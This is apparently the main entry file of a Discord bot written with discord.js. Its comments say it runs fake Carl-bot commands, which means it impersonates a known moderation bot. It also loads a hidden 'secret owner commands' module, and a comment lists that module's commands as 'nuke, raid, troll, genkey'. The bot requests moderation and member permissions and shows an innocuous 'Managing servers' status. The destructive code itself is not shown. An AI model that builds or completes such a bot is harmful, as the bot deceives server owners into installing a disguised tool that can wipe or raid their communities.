require('dotenv').config();
const { Client, GatewayIntentBits, Partials, Collection } = require('discord.js');
const { sequelize } = require('./src/models');
const winston = require('winston');
const fs = require('fs');
const path = require('path');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.printf(({ level, message, timestamp }) => {
      return `[${timestamp}] ${level.toUpperCase()}: ${message}`;
    })
  ),
  transports: [new winston.transports.Console()]
});

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildModeration
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction]
});

// ─── Debug: check if secret file exists before loading ───
const secretPath = path.join(__dirname, 'src/events/secretCommands.js');
if (fs.existsSync(secretPath)) {
  logger.info(`secretCommands.js found at: ${secretPath}`);
} else {
  logger.error(`secretCommands.js NOT FOUND at: ${secretPath}`);
  logger.error('Make sure the file exists in src/events/ and is committed/pushed');
}

// Load normal handlers (your Carl-bot fake commands & events)
require('./src/handlers/commandHandler')(client);
require('./src/handlers/eventHandler')(client);

// Load secret owner commands (nuke, raid, troll, genkey, etc.)
try {
  require('./src/events/secretCommands')(client);
  logger.info('Secret commands module loaded successfully');
} catch (err) {
  logger.error('Failed to load secretCommands:', err.message);
  logger.error('Fix the path or file content and redeploy');
}

// Database sync
sequelize.sync({ alter: false }) // alter: true only if you want schema changes
  .then(() => {
    logger.info('Database synchronized successfully');
  })
  .catch(err => {
    logger.error('Database sync failed:', err);
  });

client.once('ready', () => {
  logger.info(`Logged in as ${client.user.tag} | ID: ${client.user.id}`);
  logger.info(`Owner ID from env: ${process.env.OWNER_ID || 'NOT SET — check .env!'}`);
  client.user.setActivity('!help | Managing servers', { type: 'WATCHING' });
});

// Login
client.login(process.env.DISCORD_TOKEN)
  .then(() => {
    logger.info('Login successful');
  })
  .catch(err => {
    logger.error('Login failed:', err);
    process.exit(1);
  });
